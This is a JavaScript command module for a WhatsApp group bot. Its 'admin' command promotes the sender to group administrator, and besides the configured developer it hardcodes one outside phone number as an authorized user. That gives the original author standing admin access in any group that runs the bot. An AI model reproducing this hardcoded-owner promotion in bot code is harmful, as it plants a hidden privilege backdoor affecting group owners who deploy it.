const { malvin } = require('../malvin');
const config = require('../settings');

malvin({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Deviens administrateur (réservé au créateur)",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    if (!isGroup) return reply("❌ Cette invocation ne fonctionne que dans un groupe.");
    if (!isBotAdmins) return reply("⚠️ Je dois être administrateur pour t'octroyer les pleins pouvoirs.");

    const normalizeJid = (jid) => {
        return jid && jid.includes('@') ? jid : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "2250545477175@s.whatsapp.net"
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply("⛔ Tu n'es pas autorisé à manipuler le pouvoir des ombres.");
    }

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);

        if (userParticipant?.admin) {
            return reply("👑 Tu possèdes déjà l'autorité suprême dans ce groupe.");
        }

        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        return reply("🔱 *Le pouvoir t'a été accordé, Seigneur CRYXEN.*");

    } catch (error) {
        console.error("Erreur admin :", error);
        return reply("💥 Une erreur s'est produite lors de l'invocation du pouvoir : " + error.message);
    }
});